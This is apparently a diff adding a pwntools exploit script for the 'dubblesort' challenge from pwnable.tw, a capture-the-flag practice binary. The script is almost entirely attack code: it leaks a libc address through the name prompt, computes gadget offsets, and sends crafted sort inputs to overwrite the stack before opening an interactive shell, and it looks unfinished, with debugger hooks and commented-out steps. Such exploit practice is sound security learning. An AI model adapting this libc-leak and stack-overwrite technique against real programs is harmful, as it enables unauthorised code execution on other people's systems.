@@ -1,0 +1,59 @@
+#! /usr/bin/env python
+from pwn import *
+import sys
+
+context.terminal = ['tmux', 'splitw', '-h']
+context(log_level="error")
+#p = remote("chall.pwnable.tw", 10101)
+elf = ELF("./dubblesort")
+
+p = process("./dubblesort")
+gdb.attach(p,'b *main+319')
+
+# name goes here -> 0xffffca7c for 64 spots
+# count goes here -> 0xffffca58 this is a %u value
+# 
+# Name variable has old libc address.
+# Sending small value ("\n") will leak libc address
+
+
+p.recvuntil(b"What your name :")
+p1 = b"\x80"
+#p2 = "5"
+p.send(p1)
+
+msg1 = p.recvuntil(b"sort :").replace(b',', b' ').split(b' ')
+addr = u32(msg1[1])
+libc = addr-0x1cac90
+pop_esi = libc + 0x17828
+print(hex(elf.got['sleep']))
+print(hex(libc))
+p.sendline(b"48")
+
+for i in range(15):
+    p.recvuntil(b"number : ")
+    p.sendline(b"4")
+
+for i in range(5):
+    p.recvuntil(b"number : ")
+    p.sendline(str(libc-1))
+
+
+p.recvuntil(b"number : ")
+p.sendline(str(pop_esi))
+
+
+
+
+#p.recvuntil(b"number : ")
+#p.sendline(str(libc))
+p.recvuntil(b"number : ")
+p.sendline(b"\x00")
+
+'''
+p.recvuntil(b"number : ")
+p.sendline(b"2222")
+'''
+#p.recvuntil(b"number : ")
+#p.send(b"1111")
+p.interactive()
